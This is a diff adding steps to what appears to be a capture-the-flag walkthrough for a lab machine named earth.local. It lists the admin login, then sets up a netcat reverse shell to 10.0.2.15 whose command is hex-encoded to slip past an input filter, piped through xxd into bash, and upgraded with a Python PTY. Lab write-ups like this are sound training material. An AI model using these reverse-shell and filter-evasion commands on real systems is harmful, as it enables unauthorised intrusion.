@@ -67,3 +67,19 @@ earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4hu
 we go to https://earth.local/admin to get to the admin page, we login with 
 username: terra
 password: earthclimatechangebad4humans 
+
+we'll get a reverse shell there, first we listen to our machine at port 42069
+nc -lvnp 42069
+then we'll get a shell session on our target machine
+because the input is filtering ip, we need to get some sort of encoding involved
+this shell will be encoded to hexadecimal
+nc -e /bin/bash 10.0.2.15 42069
+6e63202d65202f62696e2f626173682031302e302e322e3135203432303639
+input to the web cli:
+
+echo 6e63202d65202f62696e2f626173682031302e302e322e3135203432303639 | xxd -r -p | bash
+
+we get the shell, then we'll upgrade the shell with
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+we now get the user privilege, now what we have to do is do some privilege escalation
